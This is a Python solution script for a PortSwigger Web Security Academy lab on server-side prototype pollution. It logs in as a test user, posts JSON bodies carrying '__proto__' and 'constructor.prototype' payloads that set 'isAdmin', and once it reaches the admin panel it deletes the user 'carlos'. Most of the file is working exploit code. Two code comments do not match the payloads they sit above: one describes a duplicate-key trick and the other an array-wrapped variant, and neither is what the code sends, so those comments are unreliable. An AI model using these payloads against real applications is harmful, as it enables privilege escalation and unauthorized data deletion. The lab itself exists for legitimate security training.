"""
Lab 9: Bypassing flawed input filters for server-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution
Difficulty: Practitioner

📝 The backend's JSON body parser or a pre-merge sanitizer blocks the
literal "__proto__" key — try structurally different JSON that still
resolves to the same merge target: nested nulls, nested nested proto keys,
nested arrays, or exploiting how JSON.parse itself handles duplicate keys.
"""

import json

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
UPDATE_PROFILE_PATH = "/my-account/update"
WIENER = {"username": "wiener", "password": "peter"}

CANDIDATE_BODIES = [
    # Straightforward — likely blocked, baseline.
    {"name": "wiener", "email": "x@x.com", "__proto__": {"isAdmin": True}},
    # Duplicate-key trick: some naive filters only check the FIRST
    # occurrence of a key; JSON.parse itself takes the LAST one.
    '{"name":"wiener","email":"x@x.com","__pro__proto__to__":{"isAdmin":true}}',
    # Array-wrapped variant some merge implementations still unwrap.
    {"name": "wiener", "email": "x@x.com", "constructor": {"prototype": {"isAdmin": True}}},
]


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    for i, body in enumerate(CANDIDATE_BODIES, 1):
        raw = body if isinstance(body, str) else json.dumps(body)
        r = s.post(f"{TARGET}{UPDATE_PROFILE_PATH}", data=raw,
                   headers={"Content-Type": "application/json"})
        log(f"Candidate {i} status: {r.status_code}")

        check = s.get(f"{TARGET}/admin")
        if check.status_code == 200:
            log(f"Candidate {i} worked — /admin now accessible.")
            r2 = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
            log(f"Delete carlos responded {r2.status_code}")
            return

    log("None of the candidates bypassed the filter — inspect the filter's", ok=False)
    note("exact blocking behavior (does it 400 the whole request, or")
    note("silently strip the key?) to narrow down which encoding it misses.")


if __name__ == "__main__":
    run()
